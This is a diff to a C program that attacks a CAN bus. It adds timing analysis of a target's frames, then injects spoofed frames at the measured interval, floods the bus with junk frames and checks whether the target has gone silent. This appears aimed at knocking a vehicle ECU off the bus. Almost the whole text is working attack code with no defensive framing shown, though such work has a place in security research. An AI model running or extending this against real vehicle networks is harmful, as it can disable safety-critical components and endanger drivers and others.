@@ -7,6 +7,8 @@
 
 #define MAX_LONG_NAME 255
 #define ID_TEST 0x07A
+#define MAX_ATTEMPTS 10
+
 char interface[MAX_LONG_NAME];
 
 void run_generators() {
@@ -28,27 +30,57 @@ void run_generators() {
   }
 }
 
+long diff_us(struct timespec *start, struct timespec *end) {
+    return (end->tv_sec - start->tv_sec) * 1000000L +
+           (end->tv_nsec - start->tv_nsec) / 1000L;
+}
+
 void attack() {
-  // if (initialize_can_interface(interface, 1)) {
-  //   fprintf(stderr, "Error initializing interface!\n");
-  //   return;
-  // }
   if (setup_filter_attack(ID_TEST)) {
     fprintf(stderr, "Error applying filter!\n");
     return;
   }
+
+  printf("\n\nSTARTING THE ATTACK!\n");
+
+  long time_diffs[512];
+  struct timespec t1, t2;
+  clock_gettime(CLOCK_MONOTONIC, &t1);
+  clock_gettime(CLOCK_MONOTONIC, &t2);
   
+  struct can_frame test_frame;
+
+  printf("\n\nANALYZING TARGET BEHAVIOUR!\n");
+  for (int i = 0; i<512; i++) {
+    do {
+      read_can_frame(&test_frame);
+    } while (test_frame.can_id != ID_TEST); 
+    clock_gettime(CLOCK_MONOTONIC, &t2);
+    time_diffs[i] = diff_us(&t1, &t2);
+    test_frame.can_id = 0x7FF;
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    clock_gettime(CLOCK_MONOTONIC, &t2);
+  }
+
+  long double sum = 0;
+  for (int i = 0; i < 512; i++) {
+      sum += time_diffs[i];
+  }
+  long avg_time = (long)(sum/512);  
+
+  printf("avg_time: %ld", avg_time);
+
   int n = 0;
   char has_message = 1;
 
-  while(n<MAX_ATTEMPTS && has_message) {
+  while(n<MAX_ATTEMPTS && has_message == 1) {
     n++;
     struct can_frame frame;
-    while (frame.can_id != ID_TEST) {
+    do {
       read_can_frame(&frame);
-    }
+    } while (frame.can_id != ID_TEST); 
     
-    usleep(10*940);
+    usleep(avg_time-510);
 
     frame.can_id = 0x1;
     for (int j = 0; j < frame.can_dlc; j++) {
@@ -56,18 +88,35 @@ void attack() {
     }
     write_can_frame(&frame);
     frame.can_id = ID_TEST;
-    for (long int i = 0; i < 16; i++) {
+    for (int i = 0; i < 1; i++) {
       write_can_frame(&frame);  
-      // usleep(2*1000);
+      usleep(30);
     }
     printf("\nFINISHED FRAME INJECTION\n"); 
     printf("FLOODING THE BUS CAN\n");
-    for (long int i = 0; i < 250; i++) {
+    for (int i = 0; i < 50; i++) {
       frame.can_id = 0x777;
       write_can_frame(&frame);  
-      usleep(2*999);
+      usleep(2*99);
     }
-    if (1){
+    usleep(1000);
+    struct timespec t1, t2;
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    clock_gettime(CLOCK_MONOTONIC, &t2);
+
+    while(diff_us(&t1, &t2) < 100000L) {
+      read_can_frame(&frame);
+      clock_gettime(CLOCK_MONOTONIC, &t2);
+    }
+
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    clock_gettime(CLOCK_MONOTONIC, &t2);
+
+    while ((read_can_frame(&frame) || frame.can_id != ID_TEST) && (diff_us(&t1, &t2) < 1000000L) ){
+      clock_gettime(CLOCK_MONOTONIC, &t2);
+    }
+
+    if (diff_us(&t1, &t2) >= 1000000L) {
       has_message = 0;
     }
   }
